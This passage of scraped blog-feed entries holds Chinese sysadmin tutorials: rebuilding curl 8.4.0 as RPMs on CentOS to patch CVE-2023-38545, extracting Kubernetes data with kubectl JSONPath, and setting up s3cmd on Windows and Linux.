libcurl, if the specific series of conditions are met. [2] 安装方式有两种，“编译” 与 “更新RPM”，本文以 RPM 方式更新 curl 到 8.4.0 版本\n下载curl源码包 升级至少需要更新至 curl 8.4 ，首先从官网下载源码包 [3]\n将curl打包为rpm 因为 curl 源码包内没有提供 rpm 的规格文件，所以我们需要自己编写，但是比较麻烦，可以让 chatgpt 生成一个，这里使用 centos7 的 curl.spec 进行修改\n安装依赖 编译时需要安装一些 build 时的依赖包\nyum install -y automake \\ groff \\ krb5-devel \\ libidn-devel \\ libssh2-devel \\ nss-devel \\ openldap-devel \\ openssh-clients \\ openssh-server \\ pkgconfig \\ stunnel \\ zlib-devel 安装 rpmbuild\nsudo yum install -y rpm-build redhat-rpm-config rpmdevtools 创建工作目录 rpmbuild 构建时是需要固定格式的目录的工作目录，下面将创建\nmkdir -pv ~/rpmbuild/{BUILD,RPMS,SOURCES,SPECS,SRPMS} 准备资源和规格文件 将准备好的规格文件 (.spec) 和源码包放置对应目录下\n.spec 放置 SPECS 目录下 源码包放置 SOURCES 下 构建 rpm 包 rpmbuild -ba rpmbuild/SPECS/curl.spec 如果不是在 ~ 目录执行，而是指定目录可以用下面命令，将变量 ${RPM_WORK_DIR} 替换为你的目录\nrpmbuild --define \u0026quot;_topdir ${RPM_WORK_DIR}\u0026quot; -ba ${RPM_WORK_DIR}/SPECS/kubernetes.spec 执行成功的日志如下\nObsoletes: curl-devel \u0026lt; 8.4.0-1.el7.1 Processing files: curl-debuginfo-8.4.0-1.el7.1.x86_64 Provides: curl-debuginfo = 8.4.0-1.el7.1 curl-debuginfo(x86-64) = 8.4.0-1.el7.1 Requires(rpmlib): rpmlib(FileDigests) \u0026lt;= 4.6.0-1 rpmlib(PayloadFilesHavePrefix) \u0026lt;= 4.0-1 rpmlib(CompressedFileNames) \u0026lt;= 3.0.4-1 Checking for unpackaged file(s): /usr/lib/rpm/check-files /root/rpmbuild/BUILDROOT/curl-8.4.0-1.el7.1.x86_64 warning: Installed (but unpackaged) file(s) found: /usr/lib64/libcurl.a Wrote: /root/rpmbuild/SRPMS/curl-8.4.0-1.el7.1.src.rpm Wrote: /root/rpmbuild/RPMS/x86_64/curl-8.4.0-1.el7.1.x86_64.rpm Wrote: /root/rpmbuild/RPMS/x86_64/libcurl-8.4.0-1.el7.1.x86_64.rpm Wrote: /root/rpmbuild/RPMS/x86_64/libcurl-devel-8.4.0-1.el7.1.x86_64.rpm Wrote: /root/rpmbuild/RPMS/x86_64/curl-debuginfo-8.4.0-1.el7.1.x86_64.rpm Executing(%clean): /bin/sh -e /var/tmp/rpm-tmp.mC4nLf + umask 022 + cd /root/rpmbuild/BUILD + cd curl-8.4.0 + rm -rf /root/rpmbuild/BUILDROOT/curl-8.4.0-1.el7.1.x86_64 + exit 0 更新curl rpm包 构建好的包在 rpmbuild 工作目录下的 RPMS/x86_64 目录下，进入直接安装 rpm 包即可完成升级\n$ cd rpmbuild/RPMS/x86_64/ $ ll total 3284 -rw-r--r-- 1 root root 358040 Oct 14 21:44 curl-8.4.0-1.el7.1.x86_64.rpm -rw-r--r-- 1 root root 1786336 Oct 14 21:44 curl-debuginfo-8.4.0-1.el7.1.x86_64.rpm -rw-r--r-- 1 root root 278012 Oct 14 21:44 libcurl-8.4.0-1.el7.1.x86_64.rpm -rw-r--r-- 1 root root 930532 Oct 14 21:44 libcurl-devel-8.4.0-1.el7.1.x86_64.rpm $ yum update libcurl-8.4.0-1.el7.1.x86_64.rpm curl-8.4.0-1.el7.1.x86_64.rpm 由图可见，直接是可以完成安装的\n更新完后检查版本信息\n$ curl -V curl 8.4.0 (x86_64-redhat-linux-gnu) libcurl/8.4.0 OpenSSL/1.0.2k-fips zlib/1.2.7 OpenLDAP/2.4.44 Release-Date: 2023-10-11 Protocols: dict file ftp ftps gopher gophers http https imap imaps ldap ldaps mqtt pop3 pop3s rtsp smb smbs smtp smtps telnet tftp Features: alt-svc AsynchDNS HSTS HTTPS-proxy IPv6 Largefile libz NTLM SSL UnixSockets 此时完成了 curl 的更新，这里更新了 curl 与 libcurl 到 8.4.0，成功的修补了漏洞\nNotes:\nCentOS 6下构建时注意取消 regenerate Makefile.in files, valgrind 是一款提升测试覆盖率的工具，可以不依赖 其余依赖自行选择，无需官方所有依赖 Reference [1] CVE-2023-38545\n[2] CVE-2023-38546\n[3] curl download\n[4] curl.spec\n","permalink":"https://www.oomkill.com/2023/10/update-curl-8-4/","summary":"","title":"CentOS6/7 curl SOCKS5堆溢出漏洞修复 CVE-2023-38545 CVE-2023-38546"},{"content":"kubernetes集群工具 kubect 提供了一种强大的数据提取的模式，jsonpath，相对于 yaml 来说，jsonpath 拥有高度的自制提取功能，以及一些更便于提取字段的模式，使得过去 kubernetes 资源信息时更便捷，在本文中将解开 jsonpath 的神秘面纱。\n什么是jsonpath JSONPath 是一种用于查询 JSON 数据结构中特定元素的查询语言。它类似于 XPath 用于 XML 数据的查询。JSONPath 允许您以一种简单而灵活的方式从 JSON 对象中提取数据，而不需要编写复杂的代码来解析 JSON 结构。\nJSONPath 使用路径表达式来指定您要检索的 JSON 数据的位置。这些路径表达式类似于文件系统中的路径，但用于导航 JSON 结构。以下是一些常见的 JSONPath 表达式示例：\n$：表示 JSON 根对象。 $.store：表示从根对象中获取名为 \u0026ldquo;store\u0026rdquo; 的属性。 $.store.book：表示从根对象中获取 \u0026ldquo;store\u0026rdquo; 属性中的 \u0026ldquo;book\u0026rdquo; 属性。 $.store.book[0]：表示获取 \u0026ldquo;store\u0026rdquo; 属性中的 \u0026ldquo;book\u0026rdquo; 属性的第一个元素。 $.store.book[?(@.price \u0026lt; 10)]：表示选择 \u0026ldquo;store\u0026rdquo; 属性中的 \u0026ldquo;book\u0026rdquo; 属性中价格小于 10 的所有元素。 Function Description Example Result text the plain text kind is {.kind} kind is List @ the current object {@} the same as input . or [] child operator {.kind} or {[‘kind’]} List .. recursive descent {..name} 127.0.0.1 127.0.0.2 myself e2e * wildcard. Get all objects {.items[*].metadata.name} [127.0.0.1 127.0.0.2] [start:end :step] subscript operator {.users[0].name} myself [,] union operator {.items[*][‘metadata.name’, ‘status.capacity’]} 127.0.0.1 127.0.0.2 map[cpu:4] map[cpu:8] ?() filter {.users[?(@.name==“e2e”)].user.password} secret range, end iterate list {range .items[*]}[{.metadata.name}, {.status.capacity}] {end} [127.0.0.1, map[cpu:4]] [127.0.0.2, map[cpu:8]] “ quote interpreted string {range .items[*]}{.metadata.name}{’\\t’}{end} 127.0.0.1 127.0.0.2 JSONPath 支持各种操作符和函数，以便更复杂地筛选和操作 JSON 数据。它在 JSON 数据的导航和过滤方面非常强大，通常用于从 JSON 数据中提取所需的信息。\nJSONPath 在各种编程语言和工具中都有实现，包括 JavaScript、Python、Java 等，因此您可以根据需要选择适合您项目的工具来使用 JSONPath 查询 JSON 数据。\nkubectl中对jsonpath的支持 例如，通常在生产环境中处理 Kubernetes 问题时，您将需要查看数百个节点和数千个 Pod 的信息，例如 Deployment, Pod, Replicat, Service, Secret 等资源信息，但要获取这些类型的资源，通常会使用 kubectl 命令，然而在50%以上的高级场景下，是过滤信息并进行整理。在这种场景下，使用 kubectl + shell 命令进行整理的却没有 jsonpath 来的实在。假设在一个大规模集群中，例如 10 万个 Node 节点，这时如果你想获得一些节点信息，或者 Pod 信息，再或者某些需要循环的条件，这时候多次的请求对你在统计数据上造成的时间成本及频繁请求API都会造成压力，这个时候 jsonpath 的功能就很好的解决了这个问题，通过一次请求，快速循环可以在很短时间内得出结果，并减少了大量请求 kube-apiserver 的压力。\nkubectl jsonpath 示例 仅获取某个资源的名称 # 语法\rkubectl -n \u0026lt;my_namespace\u0026gt; get deploy/\u0026lt;my_deployment\u0026gt; -o jsonpath='{.metadata.name}'\r获取一个 deployment的 信息\n$ kubectl get deploy/traefik -o jsonpath='{.metadata.name}'\rtraefik\r通常使用 json path 不会获取一个资源的信息，而是获取所有资源的信息，例如获取所有 Pod 的 name\n$ kubectl get pod -A -o jsonpath=\u0026quot;{.items[*]['metadata.name']}\u0026quot;\recho-hello-world-task-run-1-pod-ksdtm echo-hello-world-task-run-pod-4sx9n traefik-679bf6459c-sz9jv calico-kube-controllers-577f77cb5c-kwhph calico-node-59d5x calico-node-82zgm coredns-6b9bb479b9-wnc8n minio spin-clouddriver-88df48858-dfzkg spin-deck-5dc8f847b8-m4tbk spin-echo-69868fd866-nxn8g spin-front50-54fb4b6d67-jfkds spin-gate-7b6f4d4566-gdjkd spin-orca-7765fb5c96-9gmvr spin-redis-8485df6b88-bgrgm spin-rosco-6d77f8cb-bf2nj tekton-pipelines-controller-5cdb46974f-8rjbx tekton-pipelines-webhook-6479d769ff-756gq\rTips：jsonpath 的输出是以字符串方式输出，不会携带换行之类的\n@ 的用法 @ 表示当前对象，例如 kubectl get pods 这获取的是一个 list 列表，那么 @ 就代表这个 list，例如\n$ kubectl get pods -o=jsonpath='{@}'|jq\r{\r\u0026quot;apiVersion\u0026quot;: \u0026quot;v1\u0026quot;,\r\u0026quot;items\u0026quot;: [\r{\r\u0026quot;apiVersion\u0026quot;: \u0026quot;v1\u0026quot;,\r\u0026quot;kind\u0026quot;: \u0026quot;Pod\u0026quot;,\r\u0026quot;metadata\u0026quot;: {\r\u0026quot;annotations\u0026quot;: {\r\u0026quot;cni.projectcalico.org/containerID\u0026quot;: \u0026quot;aedb0d3f11b2572d82a7ccb456cec393f88de2c8befa4d19e69a577bb8c0e20f\u0026quot;,\r\u0026quot;cni.projectcalico.org/podIP\u0026quot;: \u0026quot;\u0026quot;,\r\u0026quot;cni.projectcalico.org/podIPs\u0026quot;: \u0026quot;\u0026quot;,\r\u0026quot;kubectl.kubernetes.io/last-applied-configuration\u0026quot;: \u0026quot;{\\\u0026quot;apiVersion\\\u0026quot;:\\\u0026quot;tekton.dev/v1beta1\\\u0026quot;,\\\u0026quot;kind\\\u0026quot;:\\\u0026quot;Task\\\u0026quot;,\\\u0026quot;metadata\\\u0026quot;:{\\\u0026quot;annotations\\\u0026quot;:{},\\\u0026quot;name\\\u0026quot;:\\\u0026quot;echo-hello-world\\\u0026quot;,\\\u0026quot;namespace\\\u0026quot;:\\\u0026quot;default\\\u0026quot;},\\\u0026quot;spec\\\u0026quot;:{\\\u0026quot;steps\\\u0026quot;:[{\\\u0026quot;args\\\u0026quot;:[\\\u0026quot;Hello World\\\u0026quot;],\\\u0026quot;command\\\u0026quot;:[\\\u0026quot;echo\\\u0026quot;],\\\u0026quot;image\\\u0026quot;:\\\u0026quot;busybox\\\u0026quot;,\\\u0026quot;name\\\u0026quot;:\\\u0026quot;echo\\\u0026quot;}]}}\\n\u0026quot;,\r\u0026quot;pipeline.tekton.dev/release\u0026quot;: \u0026quot;v0.19.0\u0026quot;,\r\u0026quot;tekton.dev/ready\u0026quot;: \u0026quot;READY\u0026quot;\r},\r\u0026quot;creationTimestamp\u0026quot;: \u0026quot;2023-06-26T15:05:54Z\u0026quot;,\r\u0026quot;labels\u0026quot;: {\r\u0026quot;app.kubernetes.io/managed-by\u0026quot;: \u0026quot;tekton-pipelines\u0026quot;,\r\u0026quot;tekton.dev/task\u0026quot;: \u0026quot;echo-hello-world\u0026quot;,\r\u0026quot;tekton.dev/taskRun\u0026quot;: \u0026quot;echo-hello-world-task-run-1\u0026quot;\r},\r\u0026quot;managedFields\u0026quot;: [\r{\r\u0026quot;apiVersion\u0026quot;: \u0026quot;v1\u0026quot;,\r\u0026quot;fieldsType\u0026quot;: \u0026quot;FieldsV1\u0026quot;,\r\u0026quot;fieldsV1\u0026quot;: {\r\u0026quot;f:metadata\u0026quot;: {\r\u0026quot;f:annotations\u0026quot;: {\r\u0026quot;f:cni.projectcalico.org/containerID\u0026quot;: {},\r\u0026quot;f:cni.projectcalico.org/podIP\u0026quot;: {},\r\u0026quot;f:cni.projectcalico.org/podIPs\u0026quot;: {}\r}\r}\r},\r\u0026quot;manager\u0026quot;: \u0026quot;calico\u0026quot;,\r\u0026quot;operation\u0026quot;: \u0026quot;Update\u0026quot;,\r\u0026quot;time\u0026quot;: \u0026quot;2023-06-26T15:05:55Z\u0026quot;\r},\r{\r\u0026quot;apiVersion\u0026quot;: \u0026quot;v1\u0026quot;,\r\u0026quot;fieldsType\u0026quot;: \u0026quot;FieldsV1\u0026quot;,\r\u0026quot;fieldsV1\u0026quot;: {\r\u0026quot;f:metadata\u0026quot;: {\r\u0026quot;f:annotations\u0026quot;: {\r\u0026quot;.\u0026quot;: {},\r\u0026quot;f:kubectl.kubernetes.io/last-applied-configuration\u0026quot;: {},\r\u0026quot;f:pipeline.tekton.dev/release\u0026quot;: {},\r\u0026quot;f:tekton.dev/ready\u0026quot;: {}\r...\r\u0026quot;nodeName\u0026quot;: \u0026quot;node01\u0026quot;,\r\u0026quot;preemptionPolicy\u0026quot;: \u0026quot;PreemptLowerPriority\u0026quot;,\r\u0026quot;priority\u0026quot;: 0,\r\u0026quot;restartPolicy\u0026quot;: \u0026quot;Never\u0026quot;,\r\u0026quot;schedulerName\u0026quot;: \u0026quot;default-scheduler\u0026quot;,\r\u0026quot;securityContext\u0026quot;: {},\r\u0026quot;serviceAccount\u0026quot;: \u0026quot;default\u0026quot;,\r\u0026quot;serviceAccountName\u0026quot;: \u0026quot;default\u0026quot;,\r\u0026quot;terminationGracePeriodSeconds\u0026quot;: 30,\r\u0026quot;tolerations\u0026quot;: [\r{\r\u0026quot;effect\u0026quot;: \u0026quot;NoExecute\u0026quot;,\r\u0026quot;key\u0026quot;: \u0026quot;node.kubernetes.io/not-ready\u0026quot;,\r\u0026quot;operator\u0026quot;: \u0026quot;Exists\u0026quot;,\r\u0026quot;tolerationSeconds\u0026quot;: 300\r},\r{\r\u0026quot;effect\u0026quot;: \u0026quot;NoExecute\u0026quot;,\r\u0026quot;key\u0026quot;: \u0026quot;node.kubernetes.io/unreachable\u0026quot;,\r\u0026quot;operator\u0026quot;: \u0026quot;Exists\u0026quot;,\r\u0026quot;tolerationSeconds\u0026quot;: 300\r}\r. 和 [] 的用法 . 和 [] 是子操作符，用于获取到列表的元素，返回值也是 list，例如获取 Pod 列表中第一个 Pod，下面是一个 [] 的使用示例，可以获取某个元素\nkubectl get pods -o=jsonpath='{.items[0]}' | jq\r{\r\u0026quot;apiVersion\u0026quot;: \u0026quot;v1\u0026quot;,\r\u0026quot;kind\u0026quot;: \u0026quot;Pod\u0026quot;,\r\u0026quot;metadata\u0026quot;: {\r\u0026quot;annotations\u0026quot;: {\r\u0026quot;cni.projectcalico.org/containerID\u0026quot;: \u0026quot;aedb0d3f11b2572d82a7ccb456cec393f88de2c8befa4d19e69a577bb8c0e20f\u0026quot;,\r...\r},\r\u0026quot;status\u0026quot;: {\r\u0026quot;conditions\u0026quot;: [\r{\r\u0026quot;lastProbeTime\u0026quot;: null,\r...\r\u0026quot;hostIP\u0026quot;: \u0026quot;10.0.0.5\u0026quot;,\r\u0026quot;initContainerStatuses\u0026quot;: [\r{\r\u0026quot;containerID\u0026quot;: \u0026quot;docker://8129d155a9e9f204a22947ae3268513a1bf4d1ce98012120ab30cfd0eca04564\u0026quot;,\r\u0026quot;image\u0026quot;: \u0026quot;sha256:5d54c55f19bc6fdda7629a4f2015255ec1bed2750a81909817bede45a4d360b5\u0026quot;,\r\u0026quot;imageID\u0026quot;: \u0026quot;docker-pullable://gcr.io/tekton-releases/github.com/tektoncd/pipeline/cmd/entrypoint@sha256:67fceb87f3f76baefcfdb35fd04d0ebfc8d91117dccb7f3194056d6727bac636\u0026quot;,\r\u0026quot;lastState\u0026quot;: {},\r\u0026quot;name\u0026quot;: \u0026quot;place-tools\u0026quot;,\r\u0026quot;ready\u0026quot;: true,\r\u0026quot;restartCount\u0026quot;: 0,\r\u0026quot;state\u0026quot;: {\r\u0026quot;terminated\u0026quot;: {\r\u0026quot;containerID\u0026quot;: \u0026quot;docker://8129d155a9e9f204a22947ae3268513a1bf4d1ce98012120ab30cfd0eca04564\u0026quot;,\r\u0026quot;exitCode\u0026quot;: 0,\r\u0026quot;finishedAt\u0026quot;: \u0026quot;2023-06-26T15:05:55Z\u0026quot;,\r\u0026quot;reason\u0026quot;: \u0026quot;Completed\u0026quot;,\r\u0026quot;startedAt\u0026quot;: \u0026quot;2023-06-26T15:05:55Z\u0026quot;\r}\r}\r}\r],\r\u0026quot;phase\u0026quot;: \u0026quot;Succeeded\u0026quot;,\r\u0026quot;podIP\u0026quot;: \u0026quot;10.244.196.131\u0026quot;,\r\u0026quot;podIPs\u0026quot;: [\r{\r\u0026quot;ip\u0026quot;: \u0026quot;10.244.196.131\u0026quot;\r}\r],\r\u0026quot;qosClass\u0026quot;: \u0026quot;BestEffort\u0026quot;,\r\u0026quot;startTime\u0026quot;: \u0026quot;2023-06-26T15:05:54Z\u0026quot;\r}\r}\r. 是 [] 的子操作符，可以获取某一个元素下的某个值，与 json 中语法相同，例如获取 Pod 列表中==第一个 Pod 的名称==\n$ kubectl get pods -o=jsonpath='{.items[0].metadata.name}'\recho-hello-world-task-run-1-pod-ksdtm\r下标操作符 : 下标操作符 “:” 可以视为一个切片，获取列表中某一些元素，语法为 [start:end :step]\n例如获取前三个元素的名称\nkubectl get pods -o=jsonpath='{.items[0:2].metadata.name}'\r获取最后两个元素\n$ kubectl get pods -n spinnaker -o jsonpath='{range .items[*]}{.metadata.name}{\u0026quot;\\n\u0026quot;}{end}'\rspin-clouddriver-88df48858-dfzkg\rspin-deck-5dc8f847b8-m4tbk\rspin-echo-69868fd866-nxn8g\rspin-front50-54fb4b6d67-jfkds\rspin-gate-7b6f4d4566-gdjkd\rspin-orca-7765fb5c96-9gmvr\rspin-redis-8485df6b88-bgrgm\rspin-rosco-6d77f8cb-bf2nj\r$ kubectl get pods -n spinnaker -o jsonpath='{range .items[-2:]}{.metadata.name}{\u0026quot;\\n\u0026quot;}{end}'\rspin-redis-8485df6b88-bgrgm\rspin-rosco-6d77f8cb-bf2nj\r过滤表达式 如果设置了 limit 参数则打印其名称\nkubectl get pods -n spinnaker -o jsonpath='{.items[?(@.spec.containers[*].resources.limits.memory != \u0026quot;\u0026quot;)].metadata.name}'\r价格大于 10 的 元素的 name\n\u0026quot;$.store.book[?(@.price \u0026gt; 10)].name\u0026quot;\rjson path 支持下列过滤操作符参考 [2]\nOperator Description == 等于。字符串值必须用单引号（而不是双引号）括起来：[?(@.color=='red')]。注意：数字与字符串比较的工作方式因播放引擎而异。在 TestEngine 中，1 不等于 “1”。在 ReadyAPI 1.9 及更早版本中，1 等于 “1”。 != 不等于，字符串值必须用单引号括起来：[?(@.color!='red')]。 \u0026gt; 大于 \u0026gt;= 大于或等于 \u0026lt; 小于 \u0026lt;= 小于或等于 =~ 匹配 JavaScript 正则表达式。例如，[?(@.description =~ /cat.*/i)] 匹配描述以 cat 开头的项目（不区分大小写）。注意：如果使用 ReadyAPI 1.1 作为播放引擎，则不支持。 ! 用于否定过滤器：[?(!@.isbn)] 匹配不具有 isbn 属性的项目。注意：如果使用 ReadyAPI 1.1 作为播放引擎，则不支持。 \u0026amp;\u0026amp; 逻辑与 AND，用于组合多个过滤表达式: [?(@.category=='fiction' \u0026amp;\u0026amp; @.price \u0026lt; 10)] || 逻辑或 OR Logical OR, 用于组合多个过滤表达式： `[?(@.category==\u0026lsquo;fiction\u0026rsquo; in 检查左侧值是否存在于右侧列表中。类似于 SQL IN 运算符。字符串比较区分大小写。 [?(@.size in ['M', 'L'])] [?('S' in @.sizes)] 注意：仅由 TestEngine 播放引擎支持。 nin 与 in 相反。检查左侧值是否不存在于右侧列表中。字符串比较区分大小写。 [?(@.size nin ['M', 'L'])] [?('S' nin @.sizes)] 注意：仅由 TestEngine 播放引擎支持。 contains 检查字符串是否包含指定的子字符串（区分大小写），或者数组是否包含指定的元素。\n[?(@.name contains 'Alex')] [?(@.numbers contains 7)] [?('ABCDEF' contains @.character)] 注意：仅由 TestEngine 播放引擎支持。 size 检查数组或字符串是否具有指定的长度。 [?(@.name size 4)] 注意：仅由 TestEngine 播放引擎支持。 empty true 匹配空数组或字符串。 [?(@.name empty true)] 注意：仅由 TestEngine 播放引擎支持。 empty false 匹配非空数组或字符串。 [?(@.name empty false)] 注意：仅由 TestEngine 播放引擎支持。 正则表达式 kubectl jsonpath 不支持正则表达式，如果需要使用正则表达式可以使用 jq 替换\n例如获取 spin 开头的 Pod 是否配置了 resources\nkubectl get pods -n spinnaker -o json | jq -r '.items[] | select(.metadata.name | test(\u0026quot;spin-\u0026quot;)).spec.resources'\rexample\n$ kubectl get pods -n spinnaker -o json | jq -r '.items[] | select(.metadata.name | test(\u0026quot;spin-\u0026quot;)).spec.resources'\rnull\rnull\rnull\rnull\rnull\rnull\rnull\rnull\rkubectl example 示例 获取 Pod 为 web 的 Pod name kubectl get pods -o jsonpath = '{.items[?(@.metadata.labels.name==\u0026quot;web\u0026quot;)].metadata.name}' 过滤一个元素 过滤 Node 地址模式\nkubectl get nodes -o jsonpath='{.items[*].status.addresses[?(@.type==\u0026quot;InternalIP\u0026quot;)]}'\r过滤元素并只打印想要的属性\nkubectl get nodes -o jsonpath='{.items[*].status.addresses[?(@.type==\u0026quot;InternalIP\u0026quot;)].address}'\r从数组中获取每个元素的单个字段 kubectl get pods -o jsonpath={$.items[*].status.hostIP}\r换行 jsonpath 在获取元素后，是一个单行字符串，如果需要换行操作可以使用下面示例\n$ kubectl get pods -o jsonpath='{range .items[*]}{.status.hostIP}{\u0026quot;\\n\u0026quot;}{end}'\r10.0.0.5\r10.0.0.5\r10.0.0.5\r循环并获得多个元素 如果想获取两个元素，可以使用下面示例\n$ kubectl get pods -o jsonpath={range .items[*]}{.status.hostIP}{\u0026quot;\\t\u0026quot;}{.status.phase}{\u0026quot;\\n\u0026quot;}{end}\r10.154.196.228\tRunning\r10.154.202.136\tRunning\r10.154.201.54\tRunning\r递归 如果想获取一个元素下所有相同名称的字段，可以使用下面示例\n递归获取所有 name 字段\n$ kubectl get pod -A -o jsonpath='{..name}'\rstep-echo place-tools echo-hello-world-task-run-1-pod-ksdtm echo-hello-world-task-run-1 tekton-internal-workspace tekton-internal-home tekton-internal-results tekton-internal-tools tekton-internal-downward tekton-creds-init-home-tlvg8 default-token-6762j step-echo HOME tekton-internal-tools tekton-internal-downward tekton-creds-init-home-tlvg8 tekton-internal-workspace tekton-i..\r...\r巧用递归简化语句，如果一个元素 (元素名称) 是独有的，那么可以使用递归直接获取到这个元素的值，例如，过去所有 containers\n$ kubectl get pods -A -o=jsonpath='{range .items[*]}{\u0026quot;pod: \u0026quot;}{.metadata.name} {\u0026quot;\\n\u0026quot;}{range ..containers[*]}{\u0026quot;\\tcontainer: \u0026quot;}{.name}{\u0026quot;\\n\\timage: \u0026quot;}{.image}{\u0026quot;\\n\u0026quot;}{end}{end}'\rpod: echo-hello-world-task-run-1-pod-ksdtm container: step-echo\rimage: busybox\rpod: echo-hello-world-task-run-pod-4sx9n container: step-echo\r获取每个 Pod limit 值 kubectl get pod -A -o jsonpath='{range $.items[*]}{\u0026quot;Pod: \u0026quot;}{.metadata.name}{\u0026quot;\\n\u0026quot;} {\u0026quot; limit_mem: \u0026quot;}{.spec.containers[*].resources.limits.memory}{\u0026quot;\\n\u0026quot;}{end}'\rPod: echo-hello-world-task-run-1-pod-ksdtm\rlimit_mem: Pod: echo-hello-world-task-run-pod-4sx9n\rlimit_mem: Pod: traefik-679bf6459c-sz9jv\rlimit_mem: Pod: calico-kube-controllers-577f77cb5c-kwhph\rlimit_mem: Pod: calico-node-59d5x\rlimit_mem: Pod: calico-node-82zgm\rlimit_mem: Pod: coredns-6b9bb479b9-wnc8n\rlimit_mem: 170Mi\rPod: minio\rlimit_mem: Pod: spin-clouddriver-88df48858-dfzkg\rlimit_mem: Pod: spin-deck-7fbf94d8bc-k7zrk\rlimit_mem: 200Mi\rPod: spin-echo-69868fd866-nxn8g\rlimit_mem: Pod: spin-front50-54fb4b6d67-jfkds\rlimit_mem: Pod: spin-gate-6d7dbf74b9-4l89r\rlimit_mem: 600Mi\rPod: spin-orca-7765fb5c96-9gmvr\rlimit_mem: Pod: spin-redis-8485df6b88-bgrgm\rlimit_mem: Pod: spin-rosco-6d77f8cb-bf2nj\rlimit_mem: Pod: tekton-pipelines-controller-5cdb46974f-8rjbx\rlimit_mem: Pod: tekton-pipelines-webhook-6479d769ff-756gq\rlimit_mem: 500Mi\r获取容器的 IP 获取单独一个 Pod\nkubectl get pod nginx-67d5fc57d8-jkfjp -n quota-example -o jsonpath='{.status.podIPs[].ip}{\u0026quot;\\n\u0026quot;}'\r循环获取\nkubectl get pod -o jsonpath='{range $.items[*]}{.status.podIPs[].ip}{\u0026quot;\\n\u0026quot;}{end}'\r10.244.196.131\r10.244.196.129\r10.244.196.186\r获取所有的 Container ID 和 Pod IP kubectl get pods --all-namespaces -o=jsonpath='{range .items[*]}[{.status.containerStatuses[0].containerID}, {.status.podIP}]{\u0026quot;\\n\u0026quot;}{end}'\r获取所有的容器名称和镜像名称 kubectl get pods -n kube-system -o=jsonpath='{range .items[*]}[{.metadata.name},{.status.containerStatuses[0].image}]{\u0026quot;\\n\u0026quot;}{end}'\r获取所有状态条件中的类型 kubectl get pod cm-test-pod -o jsonpath='{.status.conditions[*].type}'\r获取 Pod 的 apiversion kubectl get pod cm-test-pod -o jsonpath='{.apiVersion}'\r从第一个状态条件开始到最后一个结束，每隔2个获取一次 kubectl get pod cm-test-pod -o jsonpath='{.status.conditions[0:3:2].type}'\rReference [1] jsonpath\n[2] JSONPath Syntax\n[3] k8s学习-kubectl命令行 jsonpath的使用\n","permalink":"https://www.oomkill.com/2023/09/kubectl-jsonpath/","summary":"","title":"探索kubectl - 巧用jsonpath提取有用数据"},{"content":"s3cmd 是为了管理 Linux 服务器上的 S3 存储桶而创建的。 但我们也在 Windows 服务器上使用这个工具。 本文将帮助您在 Windows 系统中设置 s3cmd\nRequirment s3cmd 系统要求： s3cmd 需要 Python 2.7 或更高版本才能运行，还需要安装GPG。\n步骤1：安装 Python 从 python 官方网站下载并安装 python 2.7 或更高版本并安装。安装python后，将将其加到 PATH 环境变量。\n步骤 2： 在 Windows 上安装 GPG Gpg4win (GNU Privacy Guard for Windows) 是一款用于数字加密 (file, email) 的免费软件，可以使用以下链接下载并安装它。\n步骤3：配置 s3cmd 下载最新的 s3cmd 源代码 从s3cmd 官方页面 并解压；\n提取源代码后，使用以下命令设置 s3 环境。 它会询问您的 对象存储的 AccessKey 和 SecretKey，即 GPG 命令的路径\nC:s3cmd\u0026gt; python s3cmd --configure\rEnter new values or accept defaults in brackets with Enter.\rRefer to user manual for detailed description of all options.\rAccess key and Secret key are your identifiers for Amazon S3\rAccess Key: XXXXXXXXXXXXXXXXXXXX\rSecret Key: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rEncryption password is used to protect your files from reading\rby unauthorized persons while in transfer to S3\rEncryption password: XXXXXXXXX\rPath to GPG program: C:\\Program Files (x86)\\GNU\\GnuPG\\gpg2.exe\rWhen using secure HTTPS protocol all communication with Amazon S3\rservers is protected from 3rd party eavesdropping. This method is\rslower than plain HTTP and can't be used if you're behind a proxy\rUse HTTPS protocol [No]: Yes\rNew settings:\rAccess Key: XXXXXXXXXXXXXXXXXXXX\rSecret Key: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rEncryption password: XXXXXXXXX\rPath to GPG program: C:Program Files (x86)GNUGnuPGgpg2.exe\rUse HTTPS protocol: True\rHTTP Proxy server name:\rHTTP Proxy server port: 0\rTest access with supplied credentials? [Y/n] Y\rPlease wait, attempting to list all buckets...\rSuccess. Your access key and secret key worked fine :-)\rNow verifying that encryption works...\rSuccess. Encryption and decryption worked fine :-)\rSave settings? [y/N] Y\rConfiguration saved to 'C:\\Users\\Administrator\\Application Data\\s3cmd.ini'\r步骤4：验证 使用以下命令来验证 s3cmd 配置\n\u0026gt; python c:\\s3cmd\\s3cmd ls\r","permalink":"https://www.oomkill.com/2023/09/05-4-s3cmd-in-windows/","summary":"","title":"Ceph对象存储 - windows上安装s3cmd"},{"content":"s3cmd 是一个 Amazon S3 工具，可以用于创建 s3 bucket、向对象存储中上传，检索和管理数据，在下文将如何在 Linux 上如何安装和使用 “s3cmd” 工具。\n在 Linux 上安装 s3cmd s3cmd 在 Ubuntu/Debian, Fedora/CentOS/RHEL 这类发行版上的默认软件包存储库中都是可用的，只需在执行对应发行版的安装命令即可安装。\nCentOS/RHEL/Fedora # centos 8\r$ sudo dnf install s3cmd # centos 7\r$ sudo yum install s3cmd Ubuntu/Debian sudo apt-get install s3cmd\r安装最新版本 通常包管理仓库中的版本比较旧，或者使用的 Linux 没有包管理来获取最新版本的 s3cmd，那么可以使用源代码在系统上安装最新版本的 s3cmd，下载地址可以参考附录1 [1]\n下面以 2.2 版本进行安装\n$ wget https://sourceforge.net/projects/s3tools/files/s3cmd/2.2.0/s3cmd-2.2.0.tar.gz\r$ tar xzf s3cmd-2.2.0.tar.gz\r使用以下命令和源文件安装\n$ cd s3cmd-2.2.0 $ sudo python setup.py install 配置 s3cmd s3cmd 并不仅仅可以管理 AWS s3，也可以管理任意的 S3 对象存储，为了配置 s3cmd 我们需要 Access Key 和 Secret Key 您的 S3 来访问 S3 对象存储，通常 AWS S3 的 Access Key 和 Secret Key 需要到 Amazon security_credential 页面获取 (这里涉及到 AWS 中的用户管理)\n使用下列命令配置 s3cmd\ns3cmd --configure Note：通常这个配置是交互类型的，很多值在自维护的 S3 对象存储中不需要配置，可以一路回车即可\nEnter new values or accept defaults in brackets with Enter.\rRefer to user manual for detailed description of all options.\rAccess key and Secret key are your identifiers for Amazon S3\rAccess Key: xxxxxxxxxxxxxxxxxxxxxx\rSecret Key: 